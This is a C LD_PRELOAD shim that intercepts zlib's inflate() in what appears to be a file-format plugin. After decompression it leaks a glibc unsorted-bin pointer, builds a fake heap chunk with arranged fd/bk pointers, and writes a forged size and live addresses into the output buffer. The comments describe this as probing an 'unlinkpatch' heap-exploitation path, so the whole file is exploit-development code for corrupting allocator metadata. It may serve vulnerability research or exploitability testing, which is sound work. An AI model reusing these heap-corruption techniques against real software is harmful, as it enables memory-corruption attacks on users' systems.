/* Live-plugin probe: after the pinned inflate() writes the JIF payload into
 * `indexes`, patch the three allocator-metadata words with live addresses,
 * exactly as the pinned-driver `unlinkpatch` mode does. The fake chunk is
 * arranged inside this preload library; its fd/bk words are shim-arranged,
 * not file-chosen. No plugin source is modified. */
#define _GNU_SOURCE
#include <dlfcn.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <zlib.h>

typedef int (*inflate_fn) (z_streamp, int);

static unsigned char fake_area[96] __attribute__((aligned (16)));
static unsigned char *fake_buf;

static void
emit (const char *prefix, const unsigned char *p, size_t n)
{
  char line[512];
  int off = snprintf (line, sizeof line, "%s", prefix);
  for (size_t i = 0; i < n && off < (int) sizeof line - 4; i++)
    off += snprintf (line + off, sizeof line - off, "%02x", p[i]);
  line[off++] = '\n';
  (void) write (2, line, off);
}

__attribute__((destructor)) static void
report_exit (void)
{
  if (fake_buf)
    emit ("SHIM_FAKE_EXIT=", fake_buf, 16);
}

int
inflate (z_streamp strm, int flush)
{
  static inflate_fn real_inflate;
  unsigned char *out;
  unsigned long avail;
  int ret;

  if (! real_inflate)
    real_inflate = (inflate_fn) dlsym (RTLD_NEXT, "inflate");
  if (! real_inflate)
    return Z_STREAM_ERROR;

  out = strm ? (unsigned char *) strm->next_out : NULL;
  avail = strm ? (unsigned long) strm->avail_out : 0;
  ret = real_inflate (strm, flush);

  if (out && avail > 1000000UL && strm->total_out >= 324)
    {
      void *u = malloc (264);
      if (u)
        {
          void *unsorted, *fakechunk, *chunkA, *bin;
          size_t sz = 0x111;
          char hdr[256];
          int n;

          free (u);                  /* freed 0x110 chunk: fd = unsorted head */
          unsorted = *(void **) u;
          fake_buf = fake_area + 32;
          fakechunk = (void *) (fake_buf - 16);
          chunkA = (void *) (out + 248);
          bin = (void *) ((char *) unsorted + 0x100);

          memset (fake_area, 0x5a, sizeof fake_area);
          memcpy (fake_buf, &chunkA, sizeof chunkA);
          memcpy (fake_buf + 8, &bin, sizeof bin);
          memcpy (out + 264, &sz, sizeof sz);
          memcpy (out + 272, &unsorted, sizeof unsorted);
          memcpy (out + 280, &fakechunk, sizeof fakechunk);

          n = snprintf (hdr, sizeof hdr,
                        "SHIM_PATCH pid=%d out=%p unsorted=%p fake=%p "
                        "chunkA=%p total_out=%lu\n",
                        (int) getpid (), (void *) out, unsorted, fakechunk,
                        chunkA, (unsigned long) strm->total_out);
          (void) write (2, hdr, n);
          emit ("SHIM_PATCH_WORDS=", out + 264, 24);
        }
    }
  return ret;
}
